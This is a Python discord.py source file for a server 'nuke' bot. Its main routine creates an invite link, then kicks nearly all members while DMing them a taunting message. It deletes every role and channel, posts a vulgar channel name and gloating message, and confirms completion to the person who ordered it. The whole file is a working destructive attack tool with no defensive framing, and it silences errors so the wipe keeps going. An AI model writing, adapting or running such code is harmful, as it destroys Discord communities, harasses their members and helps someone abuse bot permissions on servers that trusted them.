import os
import discord
import asyncio
from typing import Optional

async def kick_member(member: discord.Member, reason: str = "Server Nuked by Shanks"):
    try:
        await member.kick(reason=reason)
        return True
    except:
        return False

async def delete_role(role: discord.Role):
    if role.name == "@everyone":
        return
    try:
        await role.delete()
    except:
        pass

async def delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
    except:
        pass

async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.User):
    """
    Nuke a server with full process:
    1. Create invite link (from a text channel, or create temp)
    2. Kick all members (except bot and allowed users) with 1/sec delay,
       and send DM with invite link.
    3. Delete all roles (except @everyone) with 0.5 sec delay.
    4. Delete all channels, then create new text channel "fucked-by-shanks💀".
    """
    # Step 0: Create an invite link
    invite_link = None
    # Try to find a text channel to create invite
    text_channel = next((c for c in guild.channels if isinstance(c, discord.TextChannel)), None)
    if text_channel is None:
        # No text channel? Create a temporary one (will be deleted later)
        try:
            temp_channel = await guild.create_text_channel("temp-invite")
            invite = await temp_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
            invite_link = invite.url
        except:
            pass
    else:
        try:
            invite = await text_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
            invite_link = invite.url
        except:
            pass

    if not invite_link:
        invite_link = "No invite could be created."

    # Step 1: Kick members
    # Skip bot itself, the commander (user), and any allowed users (from .env)
    allowed_ids = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
    members_to_kick = [
        m for m in guild.members
        if m.id not in allowed_ids and m.id != bot.user.id and m.id != user.id
    ]

    # Send DM to each member and kick
    for member in members_to_kick:
        try:
            dm = await member.create_dm()
            await dm.send(f"Server Nuked by Shanks\nJoin {invite_link} for more information 👺")
        except:
            pass
        await kick_member(member)
        await asyncio.sleep(1)  # rate limit

    # Step 2: Delete roles
    roles = [r for r in guild.roles if r.name != "@everyone"]
    for role in roles:
        await delete_role(role)
        await asyncio.sleep(0.5)

    # Step 3: Delete channels
    for channel in guild.channels:
        await delete_channel(channel)
        await asyncio.sleep(0.5)

    # Step 4: Create new channel
    try:
        new_channel = await guild.create_text_channel("fucked-by-shanks💀")
        await new_channel.send("This server has been nuked by Shanks 💀")
    except:
        pass

    # Notify commander
    try:
        dm = await user.create_dm()
        await dm.send(f"✅ Nuke complete on **{guild.name}**!\nInvite link: {invite_link}")
    except:
        pass
